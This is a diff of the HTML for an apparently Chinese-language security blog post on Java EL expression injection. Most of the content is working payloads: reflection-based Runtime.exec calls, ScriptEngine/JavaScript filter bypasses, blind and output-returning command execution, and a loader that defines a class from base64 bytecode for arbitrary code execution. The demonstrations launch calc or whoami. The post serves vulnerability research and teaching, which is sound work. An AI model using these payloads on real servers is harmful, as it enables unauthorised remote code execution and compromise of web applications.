class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="通用PoC"><a href="#通用PoC" class="headerlink" title="通用PoC"></a>通用PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行命令</span></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
 <p>比如我们在Java程序中可以控制输入EL表达式如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
+
 <p>如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞：</p>
-<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713154033805-2f6a4a9c-8939-4d54-aab5-58560d228715.png" alt=""></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713154033805-2f6a4a9c-8939-4d54-aab5-58560d228715.png"></p>
 <p>但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。</p>
-<h3 id="绕过方法">绕过方法</h3>
-<p>这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。</p>
-<h4 id="利用反射机制绕过">利用反射机制绕过</h4>
-<p>即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。</p>
-<h4 id="利用ScriptEngine调用JS引擎绕过">利用ScriptEngine调用JS引擎绕过</h4>
-<p>同SpEL注入中讲到的：</p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。</p>
+<h4 id="利用反射机制绕过"><a href="#利用反射机制绕过" class="headerlink" title="利用反射机制绕过"></a>利用反射机制绕过</h4><p>即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。</p>
+<h4 id="利用ScriptEngine调用JS引擎绕过"><a href="#利用ScriptEngine调用JS引擎绕过" class="headerlink" title="利用ScriptEngine调用JS引擎绕过"></a>利用ScriptEngine调用JS引擎绕过</h4><p>同SpEL注入中讲到的：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="无回显执行命令">无回显执行命令</h3>
-<p>可能大家最常见到的就是执行命令的payload，由于el表达式不能执行new等操作，所以需要用反射来构造。</p>
+
+<h3 id="无回显执行命令"><a href="#无回显执行命令" class="headerlink" title="无回显执行命令"></a>无回显执行命令</h3><p>可能大家最常见到的就是执行命令的payload，由于el表达式不能执行new等操作，所以需要用反射来构造。</p>
 <p>样例如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
 <p>或者是借助js引擎</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;new+java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
 <p>不过两者都是无回显的，不优雅。</p>
-<h3 id="有回显执行命令">有回显执行命令</h3>
-<p>最早看到的有回显相关的研究是在这篇文章：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/886%EF%BC%8C%E5%86%99%E7%9A%84%E9%9D%9E%E5%B8%B8%E5%A5%BD%EF%BC%8C%E6%9C%80%E5%90%8E%E7%9A%84payload%E5%A6%82%E4%B8%8B%EF%BC%9A">https://forum.butian.net/share/886，写的非常好，最后的payload如下：</a></p>
+<h3 id="有回显执行命令"><a href="#有回显执行命令" class="headerlink" title="有回显执行命令"></a>有回显执行命令</h3><p>最早看到的有回显相关的研究是在这篇文章：<a target="_blank" rel="noopener" href="https://forum.butian.net/share/886%EF%BC%8C%E5%86%99%E7%9A%84%E9%9D%9E%E5%B8%B8%E5%A5%BD%EF%BC%8C%E6%9C%80%E5%90%8E%E7%9A%84payload%E5%A6%82%E4%B8%8B%EF%BC%9A">https://forum.butian.net/share/886，写的非常好，最后的payload如下：</a></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStream&quot;</span>, Runtime.getRuntime().exec(<span class="string">&quot;cmd /c dir&quot;</span>).getInputStream());Thread.sleep(<span class="number">1000</span>);pageContext.setAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>, pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).available());pageContext.setAttribute(<span class="string">&quot;byteBufferClass&quot;</span>, Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>));pageContext.setAttribute(<span class="string">&quot;allocateMethod&quot;</span>, pageContext.getAttribute(<span class="string">&quot;byteBufferClass&quot;</span>).getMethod(<span class="string">&quot;allocate&quot;</span>, Integer.TYPE));pageContext.setAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>, pageContext.getAttribute(<span class="string">&quot;allocateMethod&quot;</span>).invoke(<span class="literal">null</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>)));pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).read(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array(), <span class="number">0</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>));pageContext.setAttribute(<span class="string">&quot;byteArrType&quot;</span>, pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array().getClass());pageContext.setAttribute(<span class="string">&quot;stringClass&quot;</span>, Class.forName(<span class="string">&quot;java.lang.String&quot;</span>));pageContext.setAttribute(<span class="string">&quot;stringConstructor&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringClass&quot;</span>).getConstructor(pageContext.getAttribute(<span class="string">&quot;byteArrType&quot;</span>)));pageContext.setAttribute(<span class="string">&quot;stringRes&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringConstructor&quot;</span>).newInstance(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array()));pageContext.getAttribute(<span class="string">&quot;stringRes&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
 <p>由于EL表达式不支持直接赋值以及new对象，所以需要用到pageContext.getAttribute跟pageContext.setAttribute来间接实现变量的传递，导致payload写起来非常的麻烦，也非常的臃肿。</p>
 <p>所以我们换一种思路，不再使用EL自身的语法，而是在js引擎中实现我们的逻辑。</p>
 <p>经过简化后，我们的payload如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;var s = [3];s[0] = \&quot;cmd\&quot;;s[1] = \&quot;/c\&quot;;s[2] = \&quot;whoami\&quot;;var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\&quot;GBK\&quot;).useDelimiter(\&quot;\\\\A\&quot;);var result = sc.hasNext() ? sc.next() : \&quot;\&quot;;sc.close();result;&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="任意代码执行">任意代码执行</h3>
-<p>在这里我们同样可以借助js引擎调用defineClass来实现任意代码执行的操作：</p>
+
+<h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>在这里我们同样可以借助js引擎调用defineClass来实现任意代码执行的操作：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(pageContext.request.getParameter(<span class="string">&quot;ant&quot;</span>))&#125;</span><br></pre></td></tr></table></figure>
+
 <p>ant参数内容如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">  importPackage(Packages.java.util);</span><br><span class="line">  importPackage(Packages.java.lang);</span><br><span class="line">  importPackage(Packages.java.io);</span><br><span class="line">  function <span class="title function_">Base64DecodeToByte</span><span class="params">(str)</span> &#123;</span><br><span class="line">    importPackage(Packages.sun.misc);</span><br><span class="line">    importPackage(Packages.java.util);</span><br><span class="line">    <span class="keyword">var</span> bt;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      bt = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      bt = Base64().getDecoder().decode(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">define</span><span class="params">(Classdata, cmd)</span> &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">classBytes</span> <span class="operator">=</span> Base64DecodeToByte(Classdata);</span><br><span class="line">    <span class="type">var</span> <span class="variable">byteArray</span> <span class="operator">=</span> Java.type(<span class="string">&quot;byte[]&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">int</span> <span class="operator">=</span> Java.type(<span class="string">&quot;int&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">      <span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">      byteArray.class,</span><br><span class="line">      <span class="type">int</span>.class,</span><br><span class="line">      <span class="type">int</span>.class</span><br><span class="line">    );</span><br><span class="line">    defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">cc</span> <span class="operator">=</span> defineClassMethod.invoke(</span><br><span class="line">      Thread.currentThread().getContextClassLoader(),</span><br><span class="line">      classBytes,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      classBytes.length</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> cc.getConstructor(java.lang.String.class).newInstance(cmd);</span><br><span class="line">  &#125;  </span><br><span class="line">  define(</span><br><span class="line">    <span class="string">&quot;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&quot;</span>,</span><br><span class="line">      <span class="string">&quot;calc&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
 
   </div>
 </article>
